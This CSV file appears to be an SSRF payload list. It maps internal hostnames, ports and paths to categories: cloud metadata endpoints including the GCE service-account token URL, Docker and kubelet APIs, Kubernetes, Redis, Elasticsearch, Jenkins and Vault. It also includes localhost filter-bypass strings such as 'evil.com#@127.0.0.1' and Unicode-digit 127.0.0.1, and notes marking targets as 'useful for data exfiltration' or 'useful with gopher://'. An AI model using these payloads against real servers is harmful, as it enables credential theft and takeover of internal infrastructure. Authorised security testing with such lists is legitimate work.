URL,Category,Notes
http://admin-panel:80/,Internal Services & APIs,
http://adminer:8080/,Database Services,
http://aks-metadata/,Cloud-Specific Internal Services,
http://amazon-dns-server/,Cloud-Specific Internal Services,
http://apache:80/server-status,Load Balancers & Proxies,
http://api-gateway:8080/,Internal Services & APIs,
http://artifactory:8081/,Container & Orchestration Services,
http://artifactory:8081/,CI/CD & DevOps Tools,
http://azure-ad-proxy/,Cloud-Specific Internal Services,
http://azure-metadata:80/,Cloud-Specific Internal Services,
http://backend:8080/,Internal Services & APIs,
http://bamboo:8085/,CI/CD & DevOps Tools,
http://beats:8080/,Monitoring & Logging,
http://circleci-runner:8080/,CI/CD & DevOps Tools,
http://cloud-controller-manager:10252/,Cloud-Specific Internal Services,
http://cloud-sql-proxy:3307/,Cloud-Specific Internal Services,
http://config-server:8888/,Internal Services & APIs,
http://consul:8500/,Container & Orchestration Services,
http://consul:8500/,Internal Services & APIs,
http://consul:8500/v1/status/leader,Internal Services & APIs,
http://couchdb:5984/,Database Services,
http://dashboard:3000/,Internal Services & APIs,
http://dev.azure.com/,CI/CD & DevOps Tools,
http://dockerd:2375/version,Container & Orchestration Services,Docker API - may require authentication
http://drone-server:8000/,CI/CD & DevOps Tools,
http://drone:80/,CI/CD & DevOps Tools,
http://ecs-task-metadata/,Cloud-Specific Internal Services,
http://elastic:9200/_cat/nodes,Database Services,
http://elasticsearch:9200/,Database Services,"Elasticsearch - REST API, useful for data exfiltration"
http://elasticsearch:9200/_cluster/health,Database Services,"Elasticsearch - REST API, useful for data exfiltration"
http://envoy-admin:9901/,Container & Orchestration Services,
http://envoy:9901/,Load Balancers & Proxies,
http://es-master:9200/,Database Services,
http://etcd:2379/v2/keys,Container & Orchestration Services,
http://eureka-server:8761/,Internal Services & APIs,
http://eureka:8761/,Internal Services & APIs,
http://evil.com#@127.0.0.1/,Localhost Variations & Bypass Techniques,
http://f5:80/,Load Balancers & Proxies,
http://fargate-metadata/,Cloud-Specific Internal Services,
http://gce-metadata/,Cloud-Specific Internal Services,
http://github-runner:8080/,CI/CD & DevOps Tools,
http://gitlab-registry:5005/,CI/CD & DevOps Tools,
http://gitlab-runner:8093/,CI/CD & DevOps Tools,
http://gitlab:80/,CI/CD & DevOps Tools,
http://gke-metadata/,Cloud-Specific Internal Services,
http://grafana:3000/,Monitoring & Logging,
http://grafana:3000/api/health,Monitoring & Logging,
http://haproxy:80/,Load Balancers & Proxies,
http://haproxy:8404/,Load Balancers & Proxies,
http://harbor-core:8080/,Container & Orchestration Services,
http://healthcheck:8080/health,Internal Services & APIs,
http://httpd:80/server-info,Load Balancers & Proxies,
http://influxdb:8086/,Monitoring & Logging,
http://instance-data/,Cloud Metadata Services,
http://internal-api:8080/,Internal Services & APIs,
http://istio-proxy:15000/,Container & Orchestration Services,
http://jaeger-collector:14268/,Monitoring & Logging,
http://jaeger:16686/,Monitoring & Logging,
http://jenkins-master:8080/script,CI/CD & DevOps Tools,
http://jenkins:8080/,CI/CD & DevOps Tools,
http://jenkins:8080/manage,CI/CD & DevOps Tools,
http://kafka-connect:8083/,Message Queues & Event Systems,
http://kafka-rest:8082/,Message Queues & Event Systems,
http://kafka:9092/,Message Queues & Event Systems,
http://kibana:5601/,Monitoring & Logging,
http://kube-controller-manager:10252/,Cloud-Specific Internal Services,
http://kube-scheduler:10251/,Cloud-Specific Internal Services,
http://kubernetes.default/,Container & Orchestration Services,Kubernetes API - typically requires auth tokens
http://linkerd-proxy:4191/,Container & Orchestration Services,
http://localhost:10250/,Container & Orchestration Services,
http://localhost:10255/pods,Container & Orchestration Services,
http://localhost:2375/containers/json,Container & Orchestration Services,
http://localhost:2376/containers/json,Container & Orchestration Services,
http://localhost:28017/,Database Services,
http://localhost:5984/_all_dbs,Database Services,
http://localhost:6379/,Database Services,
http://localhost:8080/,Localhost Variations & Bypass Techniques,
http://localhost:8080/jenkins/,CI/CD & DevOps Tools,
http://localhost:80:8080/,Localhost Variations & Bypass Techniques,
http://localhost:80@@127.0.0.1:8080/,Localhost Variations & Bypass Techniques,
http://localhost:9200/,Database Services,
http://localtest.me/,Localhost Variations & Bypass Techniques,
http://logstash:9600/,Monitoring & Logging,
http://metadata.google.internal/computeMetadata/v1/,Cloud Metadata Services,
http://metadata.google.internal/computeMetadata/v1/instance/hostname,Cloud Metadata Services,
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud Metadata Services,
http://metadata.google.internal/computeMetadata/v1/project/project-id,Cloud Metadata Services,
http://metadata/computeMetadata/v1/,Cloud Metadata Services,
http://metrics:8080/metrics,Internal Services & APIs,
http://microservice:3000/,Internal Services & APIs,
http://mongo:27017/,Database Services,
http://mongodb:27017/,Database Services,
http://mysql:3306/,Database Services,
http://nats:4222/,Message Queues & Event Systems,
http://nats:8222/,Message Queues & Event Systems,
http://nexus:8081/,CI/CD & DevOps Tools,
http://nginx:443/,Load Balancers & Proxies,
http://nginx:80/,Load Balancers & Proxies,
http://nginx:8080/nginx_status,Load Balancers & Proxies,
http://node-exporter:9100/,Monitoring & Logging,
http://nsqd:4151/,Message Queues & Event Systems,
http://nsqlookupd:4161/,Message Queues & Event Systems,
http://pgbouncer:6432/,Database Services,
http://phpmyadmin:80/,Database Services,
http://postgres:5432/,Database Services,
http://prometheus:9090/,Monitoring & Logging,Prometheus metrics - may expose sensitive system information
http://prometheus:9090/metrics,Monitoring & Logging,Prometheus metrics - may expose sensitive system information
http://pulsar-broker:6650/,Message Queues & Event Systems,
http://pulsar:8080/,Message Queues & Event Systems,
http://rabbitmq:15672/,Message Queues & Event Systems,
http://rabbitmq:5672/,Message Queues & Event Systems,
http://redis-master:6379/,Database Services,"Redis - text-based protocol, useful with gopher://"
http://redis-sentinel:26379/,Database Services,"Redis - text-based protocol, useful with gopher://"
http://redis:6379/,Database Services,"Redis - text-based protocol, useful with gopher://"
http://registry:5000/v2/,Container & Orchestration Services,
http://schema-registry:8081/,Message Queues & Event Systems,
http://service-discovery:8761/,Internal Services & APIs,
http://sonatype-nexus:8081/,CI/CD & DevOps Tools,
http://status-page:8080/,Internal Services & APIs,
http://teamcity:8111/,CI/CD & DevOps Tools,
http://traefik:80/,Load Balancers & Proxies,
http://traefik:8080/,Load Balancers & Proxies,
http://unix:/var/run/docker.sock/containers/json,Container & Orchestration Services,Docker API - may require authentication
http://vault:8200/,Internal Services & APIs,
http://vault:8200/v1/sys/health,Internal Services & APIs,
http://vcap.me/,Localhost Variations & Bypass Techniques,
http://vpc-dns:53/,Cloud-Specific Internal Services,
http://zipkin:9411/,Monitoring & Logging,
http://zk:2181/,Internal Services & APIs,
http://zookeeper:2181/,Internal Services & APIs,
http://①②⑦.⓪.⓪.①/,Localhost Variations & Bypass Techniques,
http://⓵⓶⓻.⓪.⓪.⓵/,Localhost Variations & Bypass Techniques,
https://10.0.0.1:6443/,Container & Orchestration Services,
https://bigip:443/,Load Balancers & Proxies,
https://dev.azure.com/_apis/serviceendpoint/endpointproxy,CI/CD & DevOps Tools,
https://kubernetes.default.svc.cluster.local/,Container & Orchestration Services,Kubernetes API - typically requires auth tokens
https://kubernetes/,Container & Orchestration Services,Kubernetes API - typically requires auth tokens
https://localhost:6443/api/v1/namespaces,Container & Orchestration Services,
ldap://ad-controller:389/,Alternative Protocols & Schemes,
ldap://ldap:389/,Alternative Protocols & Schemes,
ldaps://ldap:636/,Alternative Protocols & Schemes,
sftp://sftp-server:22/,Alternative Protocols & Schemes,
smtp://mail-server:25/,Alternative Protocols & Schemes,
telnet://telnet-server:23/,Alternative Protocols & Schemes,
tftp://tftp-server:69/,Alternative Protocols & Schemes,
